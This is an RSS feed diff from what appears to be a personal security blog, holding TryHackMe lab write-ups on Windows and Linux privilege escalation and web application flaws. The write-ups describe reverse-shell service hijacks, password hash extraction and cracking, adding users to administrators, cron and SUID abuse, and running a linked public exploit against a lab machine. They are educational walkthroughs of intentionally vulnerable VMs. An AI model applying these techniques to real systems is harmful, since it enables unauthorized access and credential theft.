+&lt;ul&gt;
+&lt;li&gt;How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Googling for the name of the web application, &lt;code&gt;online bookstore&lt;/code&gt; leads us to an &lt;a href=&#34;https://www.exploit-db.com/exploits/47887&#34;&gt;exploit&lt;/a&gt;. We copy and paste the code into a file.&lt;/p&gt;
+&lt;p&gt;Run the file &lt;code&gt;python3 test.py http://MACHINE_IP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Run the command given at the prompt &lt;code&gt;wc -c /etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;day-10---insufficient-logging-and-monitoring&#34;&gt;Day 10 - Insufficient Logging and Monitoring&lt;/h2&gt;
+&lt;h3 id=&#34;task-30&#34;&gt;Task 30&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;What IP address is the attacker using?
+Look for unauthorized login attempts.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;What kind of attack is being carried out?
+The attacker is repeatedly trying different credentials to log in.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</content>
     </item>
     
     <item>
@@ -45,6 +565,59 @@ Contents  Day 1 - Injection Day 2 - Broken Authentication Day 3 - Sensitive Data
       <guid>https://markramige.com/posts/tryhackme-windows-privesc-write-up/</guid>
       <description>This TryHackMe room gives us a vulnerable Windows Server 2019 virtual machine and demonstrates many different types of Windows privilege escalation techniques. There aren&amp;rsquo;t many challenges included in the room, but just knowing how many different ways attackers can gain elevated privileges on a Windows machine is valuable. In addition, several tools are provided that show us how easy it is to automate checking for privesc vulnerabilities on Windows.
 Contents  Service Exploits Registry Passwords Scheduled Tasks Insecure GUI Apps Startup Apps Token Impersonation Privilege Escalation Scripts  Service Exploits Task 3 First off, we&amp;rsquo;re checking permission on the daclsvc service.</description>
+      <content>&lt;p&gt;This &lt;a href=&#34;https://tryhackme.com/room/windows10privesc&#34;&gt;TryHackMe room&lt;/a&gt; gives us a vulnerable Windows Server 2019 virtual machine and demonstrates many different types of Windows privilege escalation techniques. There aren&amp;rsquo;t many challenges included in the room, but just knowing how many different ways attackers can gain elevated privileges on a Windows machine is valuable. In addition, several tools are provided that show us how easy it is to automate checking for privesc vulnerabilities on Windows.&lt;/p&gt;
+&lt;h2 id=&#34;contents&#34;&gt;Contents&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#service-exploits&#34;&gt;Service Exploits&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#registry&#34;&gt;Registry&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#passwords&#34;&gt;Passwords&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#scheduled-tasks&#34;&gt;Scheduled Tasks&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#insecure-gui-apps&#34;&gt;Insecure GUI Apps&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#startup-apps&#34;&gt;Startup Apps&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#token-impersonation&#34;&gt;Token Impersonation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#privilege-escalation-scripts&#34;&gt;Privilege Escalation Scripts&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;service-exploits&#34;&gt;Service Exploits&lt;/h2&gt;
+&lt;h3 id=&#34;task-3&#34;&gt;Task 3&lt;/h3&gt;
+&lt;p&gt;First off, we&amp;rsquo;re checking permission on the &lt;code&gt;daclsvc&lt;/code&gt; service. We notice that we have &lt;code&gt;SERVICE_CHANGE_CONFIG&lt;/code&gt; permissions and that the service runs with SYSTEM privileges. All we have to do is change the &lt;code&gt;BINARY_PATH_NAME&lt;/code&gt; of the service to make it run our reverse shell when the service starts.&lt;/p&gt;
+&lt;h3 id=&#34;task-4&#34;&gt;Task 4&lt;/h3&gt;
+&lt;p&gt;Similar to Task 3, we check the permissions of the directory containing the &lt;code&gt;unquotedsvc&lt;/code&gt; service and notice that we can write to the directory. Since the &lt;code&gt;BINARY_PATH_NAME&lt;/code&gt; is unquoted, we copy our reverse shell to the directory and rename it to &lt;code&gt;common.exe&lt;/code&gt;. Since Windows will find &lt;code&gt;common.exe&lt;/code&gt; before &lt;code&gt;Common Files&lt;/code&gt; it executes it instead of the intended service.&lt;/p&gt;
+&lt;h3 id=&#34;task-5&#34;&gt;Task 5&lt;/h3&gt;
+&lt;p&gt;We find that the registry entry for the &lt;code&gt;regsvc&lt;/code&gt; service has weak permissions. We can change the location of the service executable in the registry so that it runs our reverse shell.&lt;/p&gt;
+&lt;h3 id=&#34;task-6&#34;&gt;Task 6&lt;/h3&gt;
+&lt;p&gt;The &lt;code&gt;filepermsvc&lt;/code&gt; executable located at &lt;code&gt;C:\Program Files\File Permissions Service\filepermservice.exe&lt;/code&gt; is writeable by all users. All we have to do is replace it with our reverse shell executable and start the service.&lt;/p&gt;
+&lt;h2 id=&#34;registry&#34;&gt;Registry&lt;/h2&gt;
+&lt;h3 id=&#34;task-7&#34;&gt;Task 7&lt;/h3&gt;
+&lt;p&gt;In this task we&amp;rsquo;re checking the registry for programs that are set to run automatically at boot. These will be run with admin privileges. We notice that one program is writeable by all users. We can replace this program with our reverse shell and restart the machine to gain admin access.&lt;/p&gt;
+&lt;h3 id=&#34;task-8&#34;&gt;Task 8&lt;/h3&gt;
+&lt;p&gt;We query the registry and find that the &lt;code&gt;AlwaysInstallElevated&lt;/code&gt; key is enabled. We can generate an installer that will automatically run with elevated privileges when it is installed.&lt;/p&gt;
+&lt;h2 id=&#34;passwords&#34;&gt;Passwords&lt;/h2&gt;
+&lt;h3 id=&#34;task-9&#34;&gt;Task 9&lt;/h3&gt;
+&lt;p&gt;We can query the registry for the string &lt;code&gt;password&lt;/code&gt; to find user credentials. We find admin AutoLogin credentials and use the &lt;code&gt;winexe&lt;/code&gt; command in Kali to log on to the machine.&lt;/p&gt;
+&lt;h3 id=&#34;task-10&#34;&gt;Task 10&lt;/h3&gt;
+&lt;p&gt;A local admin user has saved their login credentials on the machine. We use the &lt;code&gt;cmdkey /list&lt;/code&gt; command to check for credentials and then the &lt;code&gt;runas /savecred&lt;/code&gt; command to take advantage of the saved credentials to run our reverse shell with admin privileges.&lt;/p&gt;
+&lt;h3 id=&#34;task-11&#34;&gt;Task 11&lt;/h3&gt;
+&lt;p&gt;We have access to backup copies of the &lt;code&gt;SAM&lt;/code&gt; and &lt;code&gt;SYSTEM&lt;/code&gt; files for our machine. We can use &lt;code&gt;creddump7&lt;/code&gt; to extract the NTLM hashes of the users on the system. We then use &lt;code&gt;hashcat&lt;/code&gt; to crack the admin password using a wordlist.&lt;/p&gt;
+&lt;h3 id=&#34;task-12&#34;&gt;Task 12&lt;/h3&gt;
+&lt;p&gt;Since we have the NTLM hash, we can now use &lt;code&gt;pass the hash&lt;/code&gt; to login to the system without even needing to crack the hash to obtain the password.&lt;/p&gt;
+&lt;h2 id=&#34;scheduled-tasks&#34;&gt;Scheduled Tasks&lt;/h2&gt;
+&lt;h3 id=&#34;task-13&#34;&gt;Task 13&lt;/h3&gt;
+&lt;p&gt;The machine has a task set to run a PowerShell script every minute with SYSTEM privileges. In addition, we have permission to write to this file. All we have to do is add a line to the script to run our reverse shell executable.&lt;/p&gt;
+&lt;h2 id=&#34;insecure-gui-apps&#34;&gt;Insecure GUI Apps&lt;/h2&gt;
+&lt;h3 id=&#34;task-14&#34;&gt;Task 14&lt;/h3&gt;
+&lt;p&gt;Pasting in a file location in the navigation input of the file open dialog bypasses the file type check that the application usually performs when opening a file. Since the application is running with admin privileges, it will also run our &lt;code&gt;cmd.exe&lt;/code&gt; with admin privileges.&lt;/p&gt;
+&lt;h2 id=&#34;startup-apps&#34;&gt;Startup Apps&lt;/h2&gt;
+&lt;h3 id=&#34;task-15&#34;&gt;Task 15&lt;/h3&gt;
+&lt;p&gt;We have permissions to write to the admin startup directory. We&amp;rsquo;re going to create a new shortcut to our reverse shell executable in the startup directory so that it will run the next time the admin user logs on.&lt;/p&gt;
+&lt;h2 id=&#34;token-impersonation&#34;&gt;Token Impersonation&lt;/h2&gt;
+&lt;h3 id=&#34;task-16&#34;&gt;Task 16&lt;/h3&gt;
+&lt;p&gt;For this task we&amp;rsquo;re exploiting a vulnerability in Windows to get local privilege execution. It turns out that if our user has &lt;code&gt;SeImpersonate&lt;/code&gt; or &lt;code&gt;SeAssignPrimaryToken&lt;/code&gt; privileges, we can use those to gain &lt;code&gt;SYSTEM&lt;/code&gt; privileges.&lt;/p&gt;
+&lt;h3 id=&#34;task-17&#34;&gt;Task 17&lt;/h3&gt;
+&lt;p&gt;We&amp;rsquo;re again abusing &lt;code&gt;SeImpersonatePrivilege&lt;/code&gt; with the PrintSpoofer vulnerability to escalate local access to &lt;code&gt;SYSTEM&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation-scripts&#34;&gt;Privilege Escalation Scripts&lt;/h2&gt;
+&lt;h3 id=&#34;task-18&#34;&gt;Task 18&lt;/h3&gt;
+&lt;p&gt;All four of these tools check for most of the vulnerabilities that we&amp;rsquo;ve experimented with. Automated tools make it extremely easy for an attacker or penetration tester to find vulnerabilities on a Windows machine.&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -55,6 +628,99 @@ Contents  Service Exploits Registry Passwords Scheduled Tasks Insecure GUI Apps 
       <guid>https://markramige.com/posts/tryhackme-linux-privesc-write-up/</guid>
       <description>This TryHackMe room gives us a vulnerable Debian virtual machine and demonstrates many different types of Linux privilege escalation techniques. There aren&amp;rsquo;t many challenges included in the room, but just knowing how many different ways attackers can root Linux boxes is valuable. In addition, several tools are provided that show us how easy it is to automate checking for privesc vulnerabilities on Linux.
 Contents  Service Exploits Weak File Permissions Sudo Cron Jobs SUID/SGID Executables Passwords &amp;amp; Keys NFS Kernel Exploits Privilege Escalation Scripts  Service Exploits Task 2 Follow the instructions given and you will end up with a setuid copy of bash to use to escalate your privileges.</description>
+      <content>&lt;p&gt;This &lt;a href=&#34;https://tryhackme.com/room/linuxprivesc&#34;&gt;TryHackMe room&lt;/a&gt; gives us a vulnerable Debian virtual machine and demonstrates many different types of Linux privilege escalation techniques. There aren&amp;rsquo;t many challenges included in the room, but just knowing how many different ways attackers can root Linux boxes is valuable. In addition, several tools are provided that show us how easy it is to automate checking for privesc vulnerabilities on Linux.&lt;/p&gt;
+&lt;h2 id=&#34;contents&#34;&gt;Contents&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#service-exploits&#34;&gt;Service Exploits&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#weak-file-permissions&#34;&gt;Weak File Permissions&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#sudo&#34;&gt;Sudo&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#cron-jobs&#34;&gt;Cron Jobs&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#suidsgid-executables&#34;&gt;SUID/SGID Executables&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#passwords--keys&#34;&gt;Passwords &amp;amp; Keys&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#nfs&#34;&gt;NFS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#kernel-exploits&#34;&gt;Kernel Exploits&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#privilege-escalation-scripts&#34;&gt;Privilege Escalation Scripts&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;service-exploits&#34;&gt;Service Exploits&lt;/h2&gt;
+&lt;h3 id=&#34;task-2&#34;&gt;Task 2&lt;/h3&gt;
+&lt;p&gt;Follow the instructions given and you will end up with a setuid copy of bash to use to escalate your privileges.&lt;/p&gt;
+&lt;h2 id=&#34;weak-file-permissions&#34;&gt;Weak File Permissions&lt;/h2&gt;
+&lt;h3 id=&#34;task-3&#34;&gt;Task 3&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the root user&amp;rsquo;s password hash?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;It&amp;rsquo;s the text you copied from the &lt;code&gt;/etc/shadow&lt;/code&gt; file between the first and second colons.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What hashing algorithm was used to produce the root user&amp;rsquo;s password hash?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Run the john the ripper command given and the output will tell you what password hash was used. I had to &lt;code&gt;gunzip&lt;/code&gt; the rockyou.txt.gz file on Kali before I could use it with &lt;code&gt;john&lt;/code&gt;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the root user&amp;rsquo;s password?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The password is given in the output of &lt;code&gt;john&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;task-4&#34;&gt;Task 4&lt;/h3&gt;
+&lt;p&gt;Follow the instructions and you should end up being able to log in as &lt;code&gt;root&lt;/code&gt; with your own password.&lt;/p&gt;
+&lt;h3 id=&#34;task-5&#34;&gt;Task 5&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Run the &amp;ldquo;id&amp;rdquo; command as the newroot user. What is the result?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Follow the instructions and we can now log in as root using the password generated with &lt;code&gt;openssl&lt;/code&gt; and inserted into &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;sudo&#34;&gt;Sudo&lt;/h2&gt;
+&lt;h3 id=&#34;task-6&#34;&gt;Task 6&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;How many programs is &amp;ldquo;user&amp;rdquo; allowed to run via sudo?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Count up the number of programs listed at the bottom of the output from &lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;One program on the list doesn&amp;rsquo;t have a shell escape sequence on &lt;a href=&#34;https://gtfobins.github.io&#34;&gt;GTFOBins&lt;/a&gt;. Which is it?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Search all the programs on &lt;a href=&#34;https://gtfobins.github.io&#34;&gt;GTFOBins&lt;/a&gt; and find the one which doesn&amp;rsquo;t provide any ways to escalate.&lt;/p&gt;
+&lt;h3 id=&#34;task-7&#34;&gt;Task 7&lt;/h3&gt;
+&lt;p&gt;Follow the instructions and you will end up with a root shell by abusing LD_PRELOAD to escalate privileges.&lt;/p&gt;
+&lt;h2 id=&#34;cron-jobs&#34;&gt;Cron Jobs&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the value of the PATH variable in /etc/crontab?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;task-8&#34;&gt;Task 8&lt;/h3&gt;
+&lt;p&gt;Follow the instructions given and you will end up with a root shell using netcat and cron.&lt;/p&gt;
+&lt;h3 id=&#34;task-9&#34;&gt;Task 9&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the value of the PATH variable in /etc/crontab?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Look at the top of /etc/crontab to answer this. This is a problem because cron executes with root permissions, so if a normal user is able to drop a script or program in cron&amp;rsquo;s path then it will be executed as root.&lt;/p&gt;
+&lt;h3 id=&#34;task-10&#34;&gt;Task 10&lt;/h3&gt;
+&lt;p&gt;Follow the instruction in the task text. You will use the fact that the &lt;code&gt;tar&lt;/code&gt; command is run by cron with a wildcard &lt;code&gt;*&lt;/code&gt; character. This allows you to generate a reverse shell binary that will connect to your netcat listener and give you root access.&lt;/p&gt;
+&lt;h2 id=&#34;suidsgid-executables&#34;&gt;SUID/SGID Executables&lt;/h2&gt;
+&lt;h3 id=&#34;task-11&#34;&gt;Task 11&lt;/h3&gt;
+&lt;p&gt;For this task we&amp;rsquo;ll find that &lt;code&gt;exim&lt;/code&gt; is SUID and the version included on this box is &lt;a href=&#34;https://www.exploit-db.com/exploits/39535&#34;&gt;vulnerable&lt;/a&gt;. The script to exploit this vulnerability is already included on the box so we just have to run it to get root access.&lt;/p&gt;
+&lt;h3 id=&#34;task-12&#34;&gt;Task 12&lt;/h3&gt;
+&lt;p&gt;In this task we execute a SUID executable which is trying to open a shared object file in our home directory. We create an object file which spawns a root shell.&lt;/p&gt;
+&lt;h3 id=&#34;task-13&#34;&gt;Task 13&lt;/h3&gt;
+&lt;p&gt;This task takes advantage of a SUID executable that attempts to execute a program without specifying an absolute path. We can then create an executable in our path that the SUID program will call and give us a root shell.&lt;/p&gt;
+&lt;h3 id=&#34;task-14&#34;&gt;Task 14&lt;/h3&gt;
+&lt;p&gt;Similar to task 13, we have a SUID executable. This time it does specify an absolute path, but our version of Bash is not updated so it allows us to define a shell function that resembles that path and executable which will then run instead of the actual executable and give us a root shell.&lt;/p&gt;
+&lt;h3 id=&#34;task-15&#34;&gt;Task 15&lt;/h3&gt;
+&lt;p&gt;This task takes advantage of another flaw in older versions of Bash. We&amp;rsquo;re going to run a SUID executable with bash debugging enabled which executes a copy of the bash executable with root privileges.&lt;/p&gt;
+&lt;h2 id=&#34;passwords--keys&#34;&gt;Passwords &amp;amp; Keys&lt;/h2&gt;
+&lt;h3 id=&#34;task-16&#34;&gt;Task 16&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;What is the full mysql command the user executed?
+The user should have executed the &lt;code&gt;mysql&lt;/code&gt; command without the password included and it would&amp;rsquo;ve prompted for a password that would not be included in the &lt;code&gt;.history&lt;/code&gt; file.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;task-17&#34;&gt;Task 17&lt;/h3&gt;
+&lt;p&gt;It&amp;rsquo;s important to set the correct permissions on config files, especially those that contain credentials. This file is world readable which makes it easy to view the root password as a normal user.&lt;/p&gt;
+&lt;h3 id=&#34;task-18&#34;&gt;Task 18&lt;/h3&gt;
+&lt;p&gt;Usually &lt;code&gt;ssh&lt;/code&gt; will give you an error if your keys do not have the correct permissions. In this case, a user backed up the root SSH keys without the correct permissions and the file ended up being world readable.&lt;/p&gt;
+&lt;h2 id=&#34;nfs&#34;&gt;NFS&lt;/h2&gt;
+&lt;h3 id=&#34;task-19&#34;&gt;Task 19&lt;/h3&gt;
+&lt;p&gt;We have root on our Kali box, so we&amp;rsquo;re going to create a SUID executable that will also have root permissions on our Debian VM since the /tmp directory doesn&amp;rsquo;t have root squashing enabled.&lt;/p&gt;
+&lt;h2 id=&#34;kernel-exploits&#34;&gt;Kernel Exploits&lt;/h2&gt;
+&lt;h3 id=&#34;task-20&#34;&gt;Task 20&lt;/h3&gt;
+&lt;p&gt;Our Debian VM is vulnerable to the Dirty COW vulnerability since it is running a kernel &amp;lt;4.8.3 and hasn&amp;rsquo;t been patched. We can exploit this vulnerability to gain a root shell.&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation-scripts&#34;&gt;Privilege Escalation Scripts&lt;/h2&gt;
+&lt;h3 id=&#34;task-21&#34;&gt;Task 21&lt;/h3&gt;
+&lt;p&gt;All three of these tools check for most of the vulnerabilities that we&amp;rsquo;ve experimented with. Automated scanning tools make it extremely easy for an attacker or penetration tester to find vulnerabilities on a Linux box.&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -65,6 +731,45 @@ Contents  Service Exploits Weak File Permissions Sudo Cron Jobs SUID/SGID Execut
       <guid>https://markramige.com/posts/tryhackme-windows-privesc-arena-write-up/</guid>
       <description>The Windows PrivEsc Arena TryHackMe room includes a vulnerable Windows 7 virtual machine and demonstrates several types of privilege escalation techniques. There aren&amp;rsquo;t many challenges included in the room, but just knowing how many different ways attackers can gain elevated privileges on a Windows machine is valuable. Also, many of the tasks show us how to use features of Metasploit to exploit Windows machines.
 Contents  Registry Escalation Service Escalation Privilege Escalation Potato Escalation Password Mining Escalation  Registry Escalation Task 3 In this task we notice that C:\Program Files\Autorun Program\program.</description>
+      <content>&lt;p&gt;The Windows PrivEsc Arena &lt;a href=&#34;https://tryhackme.com/room/windowsprivescarena&#34;&gt;TryHackMe room&lt;/a&gt; includes a vulnerable Windows 7 virtual machine and demonstrates several types of privilege escalation techniques. There aren&amp;rsquo;t many challenges included in the room, but just knowing how many different ways attackers can gain elevated privileges on a Windows machine is valuable. Also, many of the tasks show us how to use features of Metasploit to exploit Windows machines.&lt;/p&gt;
+&lt;h2 id=&#34;contents&#34;&gt;Contents&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#registry-escalation&#34;&gt;Registry Escalation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#service-escalation&#34;&gt;Service Escalation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#privilege-escalation&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#potato-escalation&#34;&gt;Potato Escalation&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#password-mining-escalation&#34;&gt;Password Mining Escalation&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;registry-escalation&#34;&gt;Registry Escalation&lt;/h2&gt;
+&lt;h3 id=&#34;task-3&#34;&gt;Task 3&lt;/h3&gt;
+&lt;p&gt;In this task we notice that &lt;code&gt;C:\Program Files\Autorun Program\program.exe&lt;/code&gt; is set to run at startup with administrator privileges. We also notice that the &lt;code&gt;Everyone&lt;/code&gt; user group has &lt;code&gt;FILE_ALL_ACCESS&lt;/code&gt; permission on &lt;code&gt;program.exe&lt;/code&gt;. This means we can replace the file with our own version and have that run at startup instead. Next we use &lt;code&gt;Metasploit&lt;/code&gt; to open a listener on our Kali box and generate a reverse shell to place on the Windows system as &lt;code&gt;program.exe&lt;/code&gt;. The next time we log on the reverse shell will run and we will be connected with administrator privileges.&lt;/p&gt;
+&lt;h3 id=&#34;task-4&#34;&gt;Task 4&lt;/h3&gt;
+&lt;p&gt;We check the registry for the &lt;code&gt;AlwaysInstallElevated&lt;/code&gt; key and notice that it is set to &lt;code&gt;1&lt;/code&gt;. This means anything we install will have elevated privileges even if we install it as a normal user. We can generate a reverse shell installer with Metasploit and install it on our Windows machine. This will automatically connect to our listener and give us elevated permissions after installation.&lt;/p&gt;
+&lt;h2 id=&#34;service-escalation&#34;&gt;Service Escalation&lt;/h2&gt;
+&lt;h3 id=&#34;task-5&#34;&gt;Task 5&lt;/h3&gt;
+&lt;p&gt;The ability to control the registry entry for a Windows service means we can replace that executable file that is run when the service starts. In this task, we create a custom service executable that adds our normal user to the &lt;code&gt;administrators&lt;/code&gt; group. After we start the service, our user will have elevated privileges.&lt;/p&gt;
+&lt;h3 id=&#34;task-6&#34;&gt;Task 6&lt;/h3&gt;
+&lt;p&gt;This task is similar to Task 5, but we don&amp;rsquo;t need registry permissions. We check the &lt;code&gt;filepermsvc&lt;/code&gt; executable and notice that the &lt;code&gt;Everyone&lt;/code&gt; group has &lt;code&gt;FILE_ALL_ACCESS&lt;/code&gt; permissions. This means we can just replace the executable with the same one we used in Task 5 and then start the service.&lt;/p&gt;
+&lt;h3 id=&#34;task-8&#34;&gt;Task 8&lt;/h3&gt;
+&lt;p&gt;Using &lt;code&gt;procmon&lt;/code&gt;, we notice that &lt;code&gt;dllsvc&lt;/code&gt; is calling &lt;code&gt;C:\Temp\hijackme.dll&lt;/code&gt;, but it is not found. We know that &lt;code&gt;C:\Temp&lt;/code&gt; is a writeable location, so we generate a reverse shell using Metasploit and copy it to that location. We can then start &lt;code&gt;dllsvc&lt;/code&gt; and our reverse shell will connect.&lt;/p&gt;
+&lt;h3 id=&#34;task-9&#34;&gt;Task 9&lt;/h3&gt;
+&lt;p&gt;Having permissions to configure a Windows service means we can change the command that runs when the service starts. We&amp;rsquo;re going to change the &lt;code&gt;daclsvc&lt;/code&gt; to run &lt;code&gt;net localgroup administrators user /add&lt;/code&gt;. This will add our user to the administrators group so that we have elevated privileges.&lt;/p&gt;
+&lt;h3 id=&#34;task-10&#34;&gt;Task 10&lt;/h3&gt;
+&lt;p&gt;When looking at the details of the &lt;code&gt;unquotedsvc&lt;/code&gt;, we notice that the &lt;code&gt;BINARY_PATH_NAME&lt;/code&gt; is unquoted. Because there&amp;rsquo;s a space in the path and we can write to that directory, we can make Windows execute &lt;code&gt;C:\Program Files\Unquoted Path Service\common.exe&lt;/code&gt; instead of &lt;code&gt;C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;h3 id=&#34;task-7&#34;&gt;Task 7&lt;/h3&gt;
+&lt;p&gt;We notice that as a normal user we can write to the &lt;code&gt;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&lt;/code&gt; directory. Any programs that we add here will be run with administrator privileges. We create a reverse shell and place it in that directory and the log back in to connect to our listener with elevated privileges.&lt;/p&gt;
+&lt;h3 id=&#34;task-14&#34;&gt;Task 14&lt;/h3&gt;
+&lt;p&gt;In this task we&amp;rsquo;re using Metasploit to suggest exploits to use based on our Windows machine version and update status. It suggests using &lt;code&gt;exploit/windows/local/ms16_014_wmi_recv_notif&lt;/code&gt;. We then run the exploit and gain elevated privileges in our reverse shell.&lt;/p&gt;
+&lt;h2 id=&#34;potato-escalation&#34;&gt;Potato Escalation&lt;/h2&gt;
+&lt;h3 id=&#34;task-11&#34;&gt;Task 11&lt;/h3&gt;
+&lt;p&gt;The &lt;a href=&#34;https://github.com/foxglovesec/Potato&#34;&gt;Potato exploit&lt;/a&gt; allows us to run an arbitrary command with elevated privileges. For this task we&amp;rsquo;re going to use Potato to run &lt;code&gt;net localgroup administrators user /add&lt;/code&gt; which gives our normal user administrator privileges.&lt;/p&gt;
+&lt;h2 id=&#34;password-mining-escalation&#34;&gt;Password Mining Escalation&lt;/h2&gt;
+&lt;h3 id=&#34;task-12&#34;&gt;Task 12&lt;/h3&gt;
+&lt;p&gt;This task has us look at a config file for possible secrets. We notice that the &lt;code&gt;&amp;lt;Password&amp;gt;&lt;/code&gt; property value is base64 encoded. We can decode it to find the account password in clear text.&lt;/p&gt;
+&lt;h3 id=&#34;task-13&#34;&gt;Task 13&lt;/h3&gt;
+&lt;p&gt;We&amp;rsquo;re going to capture a memory dump of the running &lt;code&gt;iexplore.exe&lt;/code&gt; process. Running &lt;code&gt;strings&lt;/code&gt; on the dump file allows us to extract base64 encoded passwords that have been sent to a website.&lt;/p&gt;
+</content>
     </item>
     
     <item>
@@ -75,6 +780,95 @@ Contents  Registry Escalation Service Escalation Privilege Escalation Potato Esc
       <guid>https://markramige.com/posts/tryhackme-webappsec-101-write-up/</guid>
       <description>This TryHackMe room contains a web application with multiple vulnerabilities. The tasks step us through different types of vulnerabilities with links to authoritative resources to learn more about each type. There is a good combination of hand-holding and do-it-yourself. The vulnerabilities include weak credentials, cross-site scripting (xss), command and sql injection, idor, directory traversal, and logic flaws.
 Contents  Task 2 - Walking through the application Task 4 - Authentication Task 5 - Cross Site Scripting (XSS) Task 6 - Injection Task 7 - Miscellaneous &amp;amp; Logic Flaws  Task 2 - Walking through the application We can proxy the traffic through Burp Suite to view all of the response headers.</description>
+      <content>&lt;p&gt;&lt;a href=&#34;https://tryhackme.com/room/webappsec101&#34;&gt;This TryHackMe room&lt;/a&gt; contains a web application with multiple vulnerabilities. The tasks step us through different types of vulnerabilities with links to authoritative resources to learn more about each type. There is a good combination of hand-holding and do-it-yourself. The vulnerabilities include weak credentials, cross-site scripting (xss), command and sql injection, idor, directory traversal, and logic flaws.&lt;/p&gt;
+&lt;h2 id=&#34;contents&#34;&gt;Contents&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#task-2---walking-through-the-application&#34;&gt;Task 2 - Walking through the application&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-4---authentication&#34;&gt;Task 4 - Authentication&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-5---cross-site-scripting-xss&#34;&gt;Task 5 - Cross Site Scripting (XSS)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-6---injection&#34;&gt;Task 6 - Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#task-7---miscellaneous--logic-flaws&#34;&gt;Task 7 - Miscellaneous &amp;amp; Logic Flaws&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;task-2---walking-through-the-application&#34;&gt;Task 2 - Walking through the application&lt;/h2&gt;
+&lt;p&gt;We can proxy the traffic through Burp Suite to view all of the response headers. For this web application, it sends a &lt;code&gt;Server&lt;/code&gt; and &lt;code&gt;X-Powered-By&lt;/code&gt; header with every response.&lt;/p&gt;
